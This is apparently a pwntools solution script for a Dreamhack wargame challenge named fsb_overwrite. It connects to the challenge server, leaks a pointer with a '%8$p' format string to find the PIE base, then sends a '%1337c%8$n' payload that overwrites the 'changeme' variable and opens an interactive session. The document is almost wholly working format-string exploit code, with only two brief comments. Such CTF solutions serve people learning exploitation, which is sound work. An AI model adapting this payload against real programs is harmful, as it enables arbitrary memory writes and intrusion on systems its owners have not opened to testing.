from pwn import *

p=remote("host3.dreamhack.games", 9991)
context.log_level = 'debug'
# p = process("./fsb_overwrite") 
e = ELF("./fsb_overwrite")

# Get the address of changeme variable
p.sendline(b"%8$p")
pie_base = int(p.recvline()[:-1], 16) - e.symbols["__libc_csu_init"]
changeme = pie_base + e.symbols["changeme"]

print(hex(pie_base))
print(hex(changeme))

# Exploit
payload = b'%1337c'
payload += b'%8$n' + b'A' * 6
payload += p64(changeme)

p.sendline(payload)
p.interactive()
